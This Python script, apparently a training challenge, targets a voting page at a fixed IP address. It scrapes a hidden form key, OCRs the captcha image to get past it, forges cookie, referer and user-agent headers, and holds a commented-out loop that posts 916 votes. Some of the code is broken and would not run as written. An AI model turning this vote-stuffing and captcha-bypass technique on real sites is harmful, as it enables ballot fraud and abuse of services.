#!/usr/bin/python3
import requests
import logging
from urllib import request
import shutil
from PIL import Image
import pytesseract
import argparse
import cv2
import os

def init_logger():
    """Initialize a logger for info control"""
    LOG_FORMAT = "%(message)s"
    logging.basicConfig(filename = "Control.log", level = logging.DEBUG, format = LOG_FORMAT, filemode = "w")
    logger = logging.getLogger()
    return logger

def found_key(url):
    page = request.urlopen(url)
    data = page.read()
    data = data.decode("UTF-8")
    fragment_key = ""
    key = ""
    for letter in range(len(data)):
        try:
            if data[letter:letter + 6] == "hidden":
                while(data[letter] != "/"):
                    fragment_key += data[letter]
                    letter += 1
        except:
            print("No se encontro")
        if fragment_key:
            break
    fragment_key += "/"
    for i in range(len(fragment_key)):
        try:
            if fragment_key[i:i + 5] == "value":
                while(fragment_key[i] != "/"):
                    key += fragment_key[i]
                    i += 1
        except:
            print("Something wrong")
    key = key[7:-2]
    return key

def get_image():
    image_url = "http://158.69.76.135/captcha.php"
    try:
        response = requests.get(image_url, stream = True)
        if response.status_code == 200:
            file = open("Image.png", "wb")
            file.write(response.content)
            file.close()
        else:
            raise SomeError()
    except:
        print("Something wrong")
    return "Image.png"

def get_captcha(image):
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--image", required=True,
	help="path to input image to be OCR'd")
    ap.add_argument("-p", "--preprocess", type=str, default="thresh",
	help="type of preprocessing to be done")
    args = vars(ap.parse_args())
    image = cv2.imread(args[image])
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # check to see if we should apply thresholding to preprocess the
    # image
    if args["preprocess"] == "thresh":
	    gray = cv2.threshold(gray, 0, 255,
	    	cv2.THRESH_BINARY | cv2.THRESH_OTSU)[1]
    # make a check to see if median blurring should be done to remove
    # noise
    elif args["preprocess"] == "blur":
	    gray = cv2.medianBlur(gray, 3)
    # write the grayscale image to disk as a temporary file so we can
    # apply OCR to it
    filename = "{}.png".format(os.getpid())
    cv2.imwrite(filename, gray)

log = init_logger()
url = "http://158.69.76.135/level3.php"
key = found_key(url)
image = get_image()
captcha = get_captcha(image)
header_key = {"Cookie":"HoldTheDoor={}".format(key), "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
, "referer":url}
data_key = {"id":"2277", "holdthedoor":"Submit+Query", "key":key}


#print("Sending requests....")

"""for i in range(916):
    try:
        requests.post(url, data = data_key, headers = header_key)
        log.info("Success")
    except:
        log.info("Fail")
print("Finish")"""
